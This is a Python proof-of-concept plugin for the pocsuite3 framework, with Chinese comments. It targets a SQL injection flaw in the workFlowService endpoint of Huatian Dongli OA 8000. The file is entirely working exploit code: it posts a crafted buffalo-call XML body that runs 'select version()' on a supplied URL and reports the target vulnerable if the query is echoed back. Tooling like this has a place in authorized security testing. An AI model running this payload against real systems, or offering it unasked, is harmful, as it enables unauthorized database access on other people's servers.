from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)


class HuaTianOA(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "小白"  # PoC作者的大名
    vulDate = "2022-07-16"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-16"  # 编写 PoC 的日期
    updateDate = "2022-07-16"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.peiqi.tech/wiki/oa/%E5%8D%8E%E5%A4%A9OA/%E5%8D%8E%E5%A4%A9%E5%8A%A8%E5%8A%9BOA%208000%E7%89%88%20workFlowService%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"]  # 漏洞地址来源,0day不用写
    name = "华天动力OA 8000版 workFlowService SQL注入漏洞"  # PoC 名称
    appPowerLink = "http://www.oa8000.com/"  # 漏洞厂商主页地址
    appName = "华天动力OA"  # 漏洞应用名称
    appVersion = "华天动力OA 8000版"  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """华天动力OA 8000版 workFlowService接口存在SQL注入漏洞，攻击者通过漏洞可获取数据库敏感信息"""  # 漏洞简要描述
    pocDesc = """pocsuite -r .\pocs\HTOA.py -u <url>"""  # POC用法描述

    def _check(self):
        result = []
        full_url = f"{self.url}/OAapp/bfapp/buffalo/workFlowService"
        headers = {"Accept-Encoding": "identity", "Accept-Language": "zh-CN,zh;q=0.8", "Accept": "*/*",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
                   "Accept-Charset": "GBK,utf-8;q=0.7,*;q=0.3", "Connection": "keep-alive",
                   "Cache-Control": "max-age=0"}
        data = "<buffalo-call> \r\n<method>getDataListForTree</method> \r\n<string>select version()</string> \r\n</buffalo-call>\r\n\r\n"
        try:
            response = requests.post(full_url, headers=headers, verify=False, timeout=5, data=data,
                                     allow_redirects=False)  # cookies=cookies
            res1 = response.text.split("</string>")[0]
            res2 = response.text.split("</string>")[1]
            res3 = res1.split("<string>")[1]
            res4 = res2.split("<string>")[1]
            # print(res3)
            if "version()" in response.text:
                result.append(self.url)
        except Exception:
            pass
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(HuaTianOA)#



